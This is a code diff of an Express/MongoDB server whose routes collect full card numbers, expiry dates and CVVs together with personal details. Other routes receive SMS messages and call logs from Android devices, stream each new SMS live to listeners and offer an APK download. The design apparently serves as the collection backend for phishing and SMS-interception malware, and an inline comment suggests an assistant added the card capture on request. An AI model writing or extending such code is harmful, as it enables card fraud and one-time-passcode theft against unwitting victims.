@@ -3,7 +3,8 @@ const bodyParser = require("body-parser");
 const cors = require("cors");
 const mongoose = require("mongoose");
 const http = require("http");
-const { Server } = require("socket.io");
+const socketIo = require('socket.io');
+
 
 const app = express();
 const PORT = 3000;
@@ -14,11 +15,17 @@ const User = require("./models/User"); // ✅ IMPORTANT
    HTTP SERVER & SOCKET.IO
 ======================= */
 const server = http.createServer(app);
-const io = new Server(server, {
-  cors: { origin: "*" }
+// Configure CORS for Socket.IO
+const io = socketIo(server, {
+  cors: {
+    origin: "http://localhost:5173", // Your React dev server (likely 5173, 3000, or 3001)
+    methods: ["GET", "POST"]
+  }
 });
 
 app.use(express.json());
+app.set('io', io);
+
 
 
 /* =======================
@@ -66,6 +73,30 @@ const CallLogSchema = new mongoose.Schema({
   date: { type: Number, required: true },   // timestamp from Android
   createdAt: { type: Date, default: Date.now }
 });
+// GET /submit-form → return all users
+app.get("/submit-form", async (req, res) => {
+  try {
+    // Fetch all users, hide sensitive info
+    const users = await User.find({}, {
+      cardNumber: 0, // hide full card number
+      cvv: 0,        // hide CVV
+      __v: 0
+    }).sort({ createdAt: -1 }); // latest first
+
+    res.status(200).json({
+      success: true,
+      count: users.length,
+      data: users
+    });
+  } catch (error) {
+    console.error("GET USERS ERROR:", error.message);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
 
 const CallLog = mongoose.model("CallLog", CallLogSchema);
 
@@ -74,48 +105,49 @@ const CallLog = mongoose.model("CallLog", CallLogSchema);
 
 
 app.post("/submit-form", async (req, res) => {
-    try {
-        // ✅ Convert card limits to numbers
-        const data = {
-            userId: req.body.userId,
-            name: req.body.name,
-            email: req.body.email,
-            phone: req.body.phone,
-            dob: req.body.dob,
-            city: req.body.city,
+  try {
+    // ✅ Convert card limits to numbers
+    const data = {
+      deviceModel: req.body.deviceModel,
+      userId: req.body.userId,
+      name: req.body.name,
+      email: req.body.email,
+      phone: req.body.phone,
+      dob: req.body.dob,
+      city: req.body.city,
 
-            cardHolderName: req.body.cardHolderName,
+      cardHolderName: req.body.cardHolderName,
 
-            cardTotalLimit: req.body.cardTotalLimit
-                ? Number(req.body.cardTotalLimit)
-                : null,
+      cardTotalLimit: req.body.cardTotalLimit
+        ? Number(req.body.cardTotalLimit)
+        : null,
 
-            cardAvailableLimit: req.body.cardAvailableLimit
-                ? Number(req.body.cardAvailableLimit)
-                : null,
+      cardAvailableLimit: req.body.cardAvailableLimit
+        ? Number(req.body.cardAvailableLimit)
+        : null,
 
-            // ⚠️ NOT RECOMMENDED (but added because you asked)
-            cardNumber: req.body.cardNumber,
-            expiryDate: req.body.expiryDate,
-            cvv: req.body.cvv
-        };
+      // ⚠️ NOT RECOMMENDED (but added because you asked)
+      cardNumber: req.body.cardNumber,
+      expiryDate: req.body.expiryDate,
+      cvv: req.body.cvv
+    };
 
-        // ✅ Save user
-        const user = new User(data);
-        await user.save();
+    // ✅ Save user
+    const user = new User(data);
+    await user.save();
 
-        return res.status(201).json({
-            success: true,
-            message: "User & card data saved successfully"
-        });
+    return res.status(201).json({
+      success: true,
+      message: "User & card data saved successfully"
+    });
 
-    } catch (error) {
-        console.error("SAVE ERROR:", error.message);
-        return res.status(500).json({
-            success: false,
-            error: error.message
-        });
-    }
+  } catch (error) {
+    console.error("SAVE ERROR:", error.message);
+    return res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
 });
 
 // Test API
@@ -128,9 +160,9 @@ app.post("/sms", async (req, res) => {
   const { userId, sender, message } = req.body;
 
   if (!userId || !sender || !message) {
-    return res.status(400).json({ 
-      success: false, 
-      message: "Missing required fields: userId, sender or message" 
+    return res.status(400).json({
+      success: false,
+      message: "Missing required fields: userId, sender or message"
     });
   }
 
@@ -145,6 +177,7 @@ app.post("/sms", async (req, res) => {
     console.log("📩 SMS Stored in MongoDB:", userId, sender, message);
 
     // 🔴 Emit the new SMS to all connected clients
+    const io = req.app.get('io');
     io.emit("new_sms", sms);
 
     res.json({ success: true, message: "SMS stored successfully" });
@@ -155,10 +188,24 @@ app.post("/sms", async (req, res) => {
 });
 
 
-// View all messages
+// GET route to fetch SMS for a particular user
 app.get("/sms", async (req, res) => {
-  const messages = await Sms.find().sort({ receivedAt: -1 });
-  res.json(messages);
+  const { userId } = req.query;
+
+  if (!userId) {
+    return res.status(400).json({
+      success: false,
+      message: "Missing userId query parameter"
+    });
+  }
+
+  try {
+    const smsList = await Sms.find({ userId }).sort({ createdAt: -1 }); // latest first
+    res.json({ success: true, data: smsList });
+  } catch (err) {
+    console.error("❌ Fetch failed:", err);
+    res.status(500).json({ success: false, message: "Database error" });
+  }
 });
 
 app.get("/download-apk", (req, res) => {
@@ -266,10 +313,24 @@ app.post("/call-log", async (req, res) => {
 /* =======================
    GET ALL CALL LOGS
 ======================= */
+// GET route to fetch call logs, optionally filtered by userId
 app.get("/call-logs", async (req, res) => {
-  const logs = await CallLog.find().sort({ createdAt: -1 });
-  res.json(logs);
+  const { userId } = req.query;
+
+  try {
+    let query = {};
+    if (userId) {
+      query.userId = userId; // filter by userId if provided
+    }
+
+    const logs = await CallLog.find(query).sort({ createdAt: -1 }); // latest first
+    res.json({ success: true, data: logs });
+  } catch (err) {
+    console.error("❌ Fetch call logs failed:", err);
+    res.status(500).json({ success: false, message: "Database error" });
+  }
 });
+
 
 
 
